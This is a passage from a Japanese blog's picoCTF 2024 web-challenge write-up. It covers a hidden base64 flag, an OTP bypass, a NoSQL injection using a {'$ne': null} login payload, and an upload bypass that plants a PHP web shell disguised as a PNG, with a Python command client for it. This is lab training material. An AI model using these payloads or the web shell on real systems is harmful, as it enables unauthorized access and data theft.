</span><span style="color:#d4be98;">      &lt;img alt=&quot;logo&quot; src=&quot;[img/binding_dark.gif](view-source:http://titan.picoctf.net:54581/img/binding_dark.gif)&quot;/&gt;
</span><span style="color:#d4be98;">     &lt;/a&gt;
</span><span style="color:#d4be98;">    &lt;/div&gt;
</span><span style="color:#d4be98;">    &lt;div class=&quot;navigation-container&quot;&gt;
</span><span style="color:#d4be98;">     &lt;ul&gt;
</span><span style="color:#d4be98;">      &lt;li&gt;
</span><span style="color:#d4be98;">       &lt;a href=&quot;[index.html](view-source:http://titan.picoctf.net:54581/index.html)&quot;&gt;
</span><span style="color:#d4be98;">        Home
</span><span style="color:#d4be98;">       &lt;/a&gt;
</span><span style="color:#d4be98;">      &lt;/li&gt;
</span><span style="color:#d4be98;">      &lt;li&gt;
</span><span style="color:#d4be98;">       &lt;a href=&quot;[about.html](view-source:http://titan.picoctf.net:54581/about.html)&quot;&gt;
</span><span style="color:#d4be98;">        About
</span><span style="color:#d4be98;">       &lt;/a&gt;
</span><span style="color:#d4be98;">      &lt;/li&gt;
</span><span style="color:#d4be98;">      &lt;li&gt;
</span><span style="color:#d4be98;">       &lt;a href=&quot;[contact.html](view-source:http://titan.picoctf.net:54581/contact.html)&quot;&gt;
</span><span style="color:#d4be98;">        Contact
</span><span style="color:#d4be98;">       &lt;/a&gt;
</span><span style="color:#d4be98;">      &lt;/li&gt;
</span><span style="color:#d4be98;">     &lt;/ul&gt;
</span><span style="color:#d4be98;">    &lt;/div&gt;
</span><span style="color:#d4be98;">   &lt;/nav&gt;
</span><span style="color:#d4be98;">  &lt;/header&gt;
</span><span style="color:#d4be98;">  &lt;section class=&quot;about&quot; notify_true=&quot;cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfZjZmNmI3OGF9&quot;&gt;
</span><span style="color:#d4be98;">   &lt;h1&gt;
</span><span style="color:#d4be98;">    Try inspecting the page!! You might find it there
</span><span style="color:#d4be98;">   &lt;/h1&gt;
</span><span style="color:#d4be98;">   &lt;!-- .about-container --&gt;
</span><span style="color:#d4be98;">  &lt;/section&gt;
</span><span style="color:#d4be98;">  &lt;!-- .about --&gt;
</span><span style="color:#d4be98;">  &lt;section class=&quot;why&quot;&gt;
</span><span style="color:#d4be98;">   &lt;footer&gt;
</span><span style="color:#d4be98;">    &lt;div class=&quot;bottombar&quot;&gt;
</span><span style="color:#d4be98;">     Copyright © 2023 Your_Name. All rights reserved.
</span><span style="color:#d4be98;">    &lt;/div&gt;
</span><span style="color:#d4be98;">   &lt;/footer&gt;
</span><span style="color:#d4be98;">  &lt;/section&gt;
</span><span style="color:#d4be98;"> &lt;/body&gt;
</span><span style="color:#d4be98;">&lt;/html&gt;
</span></code></pre>
<p><code>&lt;section class=&quot;about&quot; notify_true=&quot;cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfZjZmNmI3OGF9&quot;&gt;</code>この部分。
この<code>cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfZjZmNmI3OGF9</code>をcyberchefのmagicでデコードしてみるとフラグが得られる。<code>picoCTF&#123;web_succ3ssfully_d3c0ded_f6f6b78a&#125;</code></p>
<h2>introtoburp</h2>
<p><code>/</code>にアクセスすると、ユーザー登録ができるようになっている。
登録が終わると2fa authenticationを促される。適当な文字を入れてみると</p>
<pre style="background-color:#292828;"><code class="language-http"><span style="color:#d4be98;">POST /dashboard HTTP/1.1
</span><span style="color:#d4be98;">Host: titan.picoctf.net:59216
</span><span style="color:#d4be98;">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
</span><span style="color:#d4be98;">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
</span><span style="color:#d4be98;">Accept-Language: ja,en-US;q=0.7,en;q=0.3
</span><span style="color:#d4be98;">Accept-Encoding: gzip, deflate, br
</span><span style="color:#d4be98;">Content-Type: application/x-www-form-urlencoded
</span><span style="color:#d4be98;">Content-Length: 5
</span><span style="color:#d4be98;">Origin: http://titan.picoctf.net:59216
</span><span style="color:#d4be98;">Connection: close
</span><span style="color:#d4be98;">Referer: http://titan.picoctf.net:59216/dashboard
</span><span style="color:#d4be98;">Cookie: session=.eJw1jUsKAjEQRO-StYuZtB0TLxPy6aA4k4R8EBHvbg_orupBvXqLcB8vcRVOnEToLdlRHpQZnD2QRBVhRSP9EiI6ZULQJgKAkbRA0gsa4l2a22az2-nwHKIyKscLakTFtbren6XF3029lUw2z91TY7RKYDg7tb9CfL4ZTyxp.ZhKVUw.kftc7Wq4rCGqCMsxLzwS-v9g4jg
</span><span style="color:#d4be98;">Upgrade-Insecure-Requests: 1
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">otp=a
</span></code></pre>
<p>このようなリクエストがなされる。
色々試してみたが、全くわからなかったのでヒントを見てみた。ヒントいわくリクエストをぐちゃぐちゃにしてみろとのこと。だから素直に変なリクエストを送ってみた(データなしでPOSTしてみた)。</p>
<pre style="background-color:#292828;"><code class="language-http"><span style="color:#d4be98;">POST /dashboard HTTP/1.1
</span><span style="color:#d4be98;">Host: titan.picoctf.net:59216
</span><span style="color:#d4be98;">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
</span><span style="color:#d4be98;">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
</span><span style="color:#d4be98;">Accept-Language: ja,en-US;q=0.7,en;q=0.3
</span><span style="color:#d4be98;">Accept-Encoding: gzip, deflate, br
</span><span style="color:#d4be98;">Content-Type: application/x-www-form-urlencoded
</span><span style="color:#d4be98;">Content-Length: 5
</span><span style="color:#d4be98;">Origin: http://titan.picoctf.net:59216
</span><span style="color:#d4be98;">Connection: close
</span><span style="color:#d4be98;">Referer: http://titan.picoctf.net:59216/dashboard
</span><span style="color:#d4be98;">Cookie: session=.eJw1jUsKAjEQRO-StYuZtB0TLxPy6aA4k4R8EBHvbg_orupBvXqLcB8vcRVOnEToLdlRHpQZnD2QRBVhRSP9EiI6ZULQJgKAkbRA0gsa4l2a22az2-nwHKIyKscLakTFtbren6XF3029lUw2z91TY7RKYDg7tb9CfL4ZTyxp.ZhKVUw.kftc7Wq4rCGqCMsxLzwS-v9g4jg
</span><span style="color:#d4be98;">Upgrade-Insecure-Requests: 1
</span></code></pre>
<p>そうしたらフラグが得られた。</p>
<pre style="background-color:#292828;"><code class="language-http"><span style="color:#d4be98;">HTTP/1.1 200 OK
</span><span style="color:#d4be98;">Server: Werkzeug/3.0.1 Python/3.8.10
</span><span style="color:#d4be98;">Date: Sun, 07 Apr 2024 12:45:51 GMT
</span><span style="color:#d4be98;">Content-Type: text/html; charset=utf-8
</span><span style="color:#d4be98;">Content-Length: 102
</span><span style="color:#d4be98;">Vary: Cookie
</span><span style="color:#d4be98;">Connection: close
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">Welcome, a you sucessfully bypassed the OTP request. 
</span><span style="color:#d4be98;">Your Flag: picoCTF&#123;#0TP_Bypvss_SuCc3$S_3e3ddc76&#125;
</span></code></pre>
<p>おもんないね。</p>
<h2>unminify</h2>
<p>サイトにアクセスしたらこのようなメッセージがあったので</p>
<blockquote>
<p>If you're reading this, your browser has succesfully received the flag.</p>
<p>I just deliver flags, I don't know how to read them...</p>
</blockquote>
<pre style="background-color:#292828;"><code class="language-html"><span style="color:#d4be98;">&lt;!doctype html&gt;
</span><span style="color:#d4be98;">&lt;html lang=&quot;en&quot;&gt;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">&lt;head&gt;
</span><span style="color:#d4be98;">    &lt;meta charset=&quot;utf-8&quot;&gt;
</span><span style="color:#d4be98;">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1&quot;&gt;
</span><span style="color:#d4be98;">    &lt;title&gt;picoCTF - picoGym | Unminify Challenge&lt;/title&gt;
</span><span style="color:#d4be98;">    &lt;link rel=&quot;icon&quot; type=&quot;image/png&quot; sizes=&quot;32x32&quot; href=&quot;/favicon-32x32.png&quot;&gt;
</span><span style="color:#d4be98;">    &lt;style&gt;
</span><span style="color:#d4be98;">        body &#123;
</span><span style="color:#d4be98;">            font-family: &quot;Lucida Console&quot;, Monaco, monospace
</span><span style="color:#d4be98;">        &#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">        h1,
</span><span style="color:#d4be98;">        p &#123;
</span><span style="color:#d4be98;">            color: #000
</span><span style="color:#d4be98;">        &#125;
</span><span style="color:#d4be98;">    &lt;/style&gt;
</span><span style="color:#d4be98;">&lt;/head&gt;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">&lt;body class=&quot;picoctf&#123;&#125;&quot; style=&quot;margin:0&quot;&gt;
</span><span style="color:#d4be98;">    &lt;div class=&quot;picoctf&#123;&#125;&quot; style=&quot;margin:0;padding:0;background-color:#757575;display:auto;height:40%&quot;&gt;&lt;a
</span><span style="color:#d4be98;">            class=&quot;picoctf&#123;&#125;&quot; href=&quot;/&quot;&gt;&lt;img src=&quot;picoctf-logo-horizontal-white.svg&quot; alt=&quot;picoCTF logo&quot;
</span><span style="color:#d4be98;">                style=&quot;display:inline-block;width:160px;height:90px;padding-left:30px&quot;&gt;&lt;/a&gt;&lt;/div&gt;
</span><span style="color:#d4be98;">    &lt;center&gt;&lt;br class=&quot;picoctf&#123;&#125;&quot;&gt;&lt;br class=&quot;picoctf&#123;&#125;&quot;&gt;
</span><span style="color:#d4be98;">        &lt;div class=&quot;picoctf&#123;&#125;&quot;
</span><span style="color:#d4be98;">            style=&quot;padding-top:30px;border-radius:3%;box-shadow:0 5px 10px #0000004d;width:50%;align-self:center&quot;&gt;&lt;img
</span><span style="color:#d4be98;">                class=&quot;picoctf&#123;&#125;&quot; src=&quot;hero.svg&quot; alt=&quot;flag art&quot; style=&quot;width:150px;height:150px&quot;&gt;
</span><span style="color:#d4be98;">            &lt;div class=&quot;picoctf&#123;&#125;&quot; style=&quot;width:85%&quot;&gt;
</span><span style="color:#d4be98;">                &lt;h2 class=&quot;picoctf&#123;&#125;&quot;&gt;Welcome to my flag distribution website!&lt;/h2&gt;
</span><span style="color:#d4be98;">                &lt;div class=&quot;picoctf&#123;&#125;&quot; style=&quot;width:70%&quot;&gt;
</span><span style="color:#d4be98;">                    &lt;p class=&quot;picoctf&#123;&#125;&quot;&gt;If you&#39;re reading this, your browser has succesfully received the flag.&lt;/p&gt;
</span><span style="color:#d4be98;">                    &lt;p class=&quot;picoCTF&#123;pr3tty_c0d3_ed938a7e&#125;&quot;&gt;&lt;/p&gt;
</span><span style="color:#d4be98;">                    &lt;p class=&quot;picoctf&#123;&#125;&quot;&gt;I just deliver flags, I don&#39;t know how to read them...&lt;/p&gt;
</span><span style="color:#d4be98;">                &lt;/div&gt;
</span><span style="color:#d4be98;">            &lt;/div&gt;&lt;br class=&quot;picoctf&#123;&#125;&quot;&gt;
</span><span style="color:#d4be98;">        &lt;/div&gt;
</span><span style="color:#d4be98;">    &lt;/center&gt;
</span><span style="color:#d4be98;">&lt;/body&gt;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">&lt;/html&gt;⏎  
</span></code></pre>
<p>ソースコードを調べてみたらフラグが見つかった。
<code>picoCTF&#123;pr3tty_c0d3_ed938a7e&#125;</code></p>
<h2>no sql injection</h2>
<p>サイトのソースコードが配られた。
サイトにアクセスするとログインフォームが現れる。</p>
<pre style="background-color:#292828;"><code class="language-js"><span style="color:#d4be98;">import User from &quot;@/models/user&quot;;
</span><span style="color:#d4be98;">import &#123; connectToDB &#125; from &quot;@/utils/database&quot;;
</span><span style="color:#d4be98;">import &#123; seedUsers &#125; from &quot;@/utils/seed&quot;;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">export const POST = async (req: any) =&gt; &#123;
</span><span style="color:#d4be98;">  const &#123; email, password &#125; = await req.json();
</span><span style="color:#d4be98;">  try &#123;
</span><span style="color:#d4be98;">    await connectToDB();
</span><span style="color:#d4be98;">    await seedUsers();
</span><span style="color:#d4be98;">    const users = await User.find(&#123;
</span><span style="color:#d4be98;">      email: email.startsWith(&quot;&#123;&quot;) &amp;&amp; email.endsWith(&quot;&#125;&quot;) ? JSON.parse(email) : email,
</span><span style="color:#d4be98;">      password: password.startsWith(&quot;&#123;&quot;) &amp;&amp; password.endsWith(&quot;&#125;&quot;) ? JSON.parse(password) : password
</span><span style="color:#d4be98;">    &#125;);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    if (users.length &lt; 1)
</span><span style="color:#d4be98;">      return new Response(&quot;Invalid email or password&quot;, &#123; status: 401 &#125;);
</span><span style="color:#d4be98;">    else &#123;
</span><span style="color:#d4be98;">      return new Response(JSON.stringify(users), &#123; status: 200 &#125;);
</span><span style="color:#d4be98;">    &#125;
</span><span style="color:#d4be98;">  &#125; catch (error) &#123;
</span><span style="color:#d4be98;">    return new Response(&quot;Internal Server Error&quot;, &#123; status: 500 &#125;);
</span><span style="color:#d4be98;">  &#125;
</span><span style="color:#d4be98;">&#125;;
</span></code></pre>
<p>ソースコード(api/login/route.ts)を見るとこのログインで渡された<code>email</code>や<code>password</code>が<code>&quot;&#123;&quot;</code>で始まり<code>&quot;&#125;&quot;</code>で終わる場合Jsonとして解釈するようになっていることがわかる。また、なんのサニタイズもなくクエリとして使っている。よってここにNo Sql Injectionの脆弱性がある。
リクエストをInterceptして、POSTデータを悪意のあるものに変えると、</p>
<pre style="background-color:#292828;"><code class="language-http"><span style="color:#d4be98;">POST /api/login HTTP/1.1
</span><span style="color:#d4be98;">Host: atlas.picoctf.net:57221
</span><span style="color:#d4be98;">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
</span><span style="color:#d4be98;">Accept: */*
</span><span style="color:#d4be98;">Accept-Language: ja,en-US;q=0.7,en;q=0.3
</span><span style="color:#d4be98;">Accept-Encoding: gzip, deflate, br
</span><span style="color:#d4be98;">Content-Type: text/plain;charset=UTF-8
</span><span style="color:#d4be98;">Content-Length: 60
</span><span style="color:#d4be98;">Referer: http://atlas.picoctf.net:57221/
</span><span style="color:#d4be98;">Origin: http://atlas.picoctf.net:57221
</span><span style="color:#d4be98;">Connection: close
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">&#123;&quot;email&quot;: &quot;&#123;\&quot;$ne\&quot;: null&#125;&quot;, &quot;password&quot;: &quot;&#123;\&quot;$ne\&quot;: null&#125;&quot; &#125;
</span></code></pre>
<pre style="background-color:#292828;"><code class="language-http"><span style="color:#d4be98;">HTTP/1.1 200 OK
</span><span style="color:#d4be98;">vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Accept-Encoding
</span><span style="color:#d4be98;">content-type: text/plain;charset=UTF-8
</span><span style="color:#d4be98;">date: Sun, 07 Apr 2024 13:04:13 GMT
</span><span style="color:#d4be98;">connection: close
</span><span style="color:#d4be98;">Content-Length: 237
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">[&#123;&quot;_id&quot;:&quot;661298c3ac7c18084809dc5d&quot;,&quot;email&quot;:&quot;joshiriya355@mumbama.com&quot;,&quot;firstName&quot;:&quot;Josh&quot;,&quot;lastName&quot;:&quot;Iriya&quot;,&quot;password&quot;:&quot;Je80T8M7sUA&quot;,&quot;token&quot;:&quot;cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzE0MzI5Y2ZhfQ==&quot;,&quot;__v&quot;:0&#125;]
</span></code></pre>
<p>ユーザー情報を含んだレスポンスが返ってくる。tokenが怪しいと思ったのでbase64でデコードしたらフラグを得ることができた。<code>picoCTF&#123;jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_14329cfa&#125;</code></p>
<h2>trickster</h2>
<p>画像をアップロードすることができるアプリケーションだ。
どんなファイルをアップロードできるか色々調べてみると、PNGのヘッダーが含まれていて、ファイル名に<code>.png</code>が含まれているものをアップロードすることができることがわかった。
よってpixloadというツールを使ってweb shellを提供する、PNGのふりをしたPHPファイルを作成して、それをつかってフラグを得た。</p>
<pre style="background-color:#292828;"><code class="language-bash"><span style="color:#d4be98;">pixload-png --payload &quot;&lt;?php system(\$_GET[&#39;cmd&#39;]); ?&gt;&quot; payload.png.php
</span></code></pre>
<pre style="background-color:#292828;"><code class="language-bash"><span style="color:#d4be98;">xxd payload.png.php
</span></code></pre>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
</span><span style="color:#d4be98;">00000010: 0000 0020 0000 0020 0802 0000 00fc 18ed  ... ... ........
</span><span style="color:#d4be98;">00000020: a300 0000 0970 4859 7300 000e c400 000e  .....pHYs.......
</span><span style="color:#d4be98;">00000030: c401 952b 0e1b 0000 0019 4944 4154 4889  ...+......IDATH.
</span><span style="color:#d4be98;">00000040: edc1 3101 0000 00c2 a0f5 4fed 610d a000  ..1.......O.a...
</span><span style="color:#d4be98;">00000050: 0000 6e0c 2000 01c8 a288 fe00 0000 0049  ..n. ..........I
</span><span style="color:#d4be98;">00000060: 454e 44ae 4260 8200 0000 0000 0000 0000  END.B`..........
</span><span style="color:#d4be98;">00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
</span><span style="color:#d4be98;">00000080: 0000 0000 0000 0000 0000 0000 0000 0000  ................
</span><span style="color:#d4be98;">00000090: 0000 0000 0000 0000 0000 0000 0000 0000  ................
</span><span style="color:#d4be98;">000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
</span><span style="color:#d4be98;">000000b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
</span><span style="color:#d4be98;">000000c0: 001e 5055 6e4b 3c3f 7068 7020 7379 7374  ..PUnK&lt;?php syst
</span><span style="color:#d4be98;">000000d0: 656d 2824 5f47 4554 5b27 636d 6427 5d29  em($_GET[&#39;cmd&#39;])
</span><span style="color:#d4be98;">000000e0: 3b20 3f3e 4d17 ebeb 0049 454e 44         ; ?&gt;M....IEND
</span></code></pre>
<p>使いやすいようなスクリプトも書いた。</p>
<pre style="background-color:#292828;"><code class="language-python"><span style="color:#d4be98;">import requests
</span><span style="color:#d4be98;">import urllib.parse
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">url = &quot;http://atlas.picoctf.net:59319/uploads/payload.png.php?cmd=&quot;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">while True:
</span><span style="color:#d4be98;">    payload = &quot;echo &#39;\n&#39;;&quot; + input(&quot;$ &quot;)
</span><span style="color:#d4be98;">    urllib.parse.quote(payload)
</span><span style="color:#d4be98;">    resp = requests.get(url + payload)
</span><span style="color:#d4be98;">    print(resp.text)
</span></code></pre>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">$ ls
</span><span style="color:#d4be98;">�PNG
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">�nDR ���        pHYs���+DATH���1 �O�a
</span><span style="color:#d4be98;">   Ȣ��IEND�B`�PUnK
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">payload.png.php
</span><span style="color:#d4be98;">M��IEND
</span><span style="color:#d4be98;">$ ls ../
</span><span style="color:#d4be98;">�PNG
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">�nDR ���        pHYs���+DATH���1 �O�a
</span><span style="color:#d4be98;">   Ȣ��IEND�B`�PUnK
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">MFRDAZLDMUYDG.txt
</span><span style="color:#d4be98;">index.php
</span><span style="color:#d4be98;">instructions.txt
</span><span style="color:#d4be98;">robots.txt
</span><span style="color:#d4be98;">uploads
</span><span style="color:#d4be98;">M��IEND
</span><span style="color:#d4be98;">$ cat ../MFRDAZLDMUYDG.txt
</span><span style="color:#d4be98;">�PNG
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">�nDR ���        pHYs���+DATH���1 �O�a
</span><span style="color:#d4be98;">   Ȣ��IEND�B`�PUnK
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">/* picoCTF&#123;c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03&#125; */M��IEND
</span><span style="color:#d4be98;">$
</span></code></pre>
<p>writeup終わり。次は<a href="https://ctftime.org/event/2254">Space Heroes 2024</a>に参加してそのWriteupを書く予定。</p>
